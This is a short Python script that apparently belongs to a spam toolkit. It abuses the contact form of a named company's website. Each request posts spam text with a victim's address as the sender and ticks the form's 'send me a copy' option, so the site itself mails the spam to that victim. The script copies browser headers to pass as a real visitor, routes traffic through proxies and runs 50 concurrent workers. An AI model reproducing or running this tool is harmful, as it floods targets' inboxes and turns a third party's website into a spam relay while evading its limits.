headers = {
    'authority': 'www.komoventures.com',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.komoventures.com',
    'pragma': 'no-cache',
    'referer': 'https://www.komoventures.com/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        return response.status_code < 400

    def post(self, target) -> requests.Response | None:
        data = {
            'name': 'test',
            'email': target,
            'subject': self.get_text(),
            'message': self.get_text(),
            'copy': 'on',
        }

        response = requests.post('https://www.komoventures.com/demo-contacts.php', headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = ''
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(50)


if __name__ == '__main__':
    main()
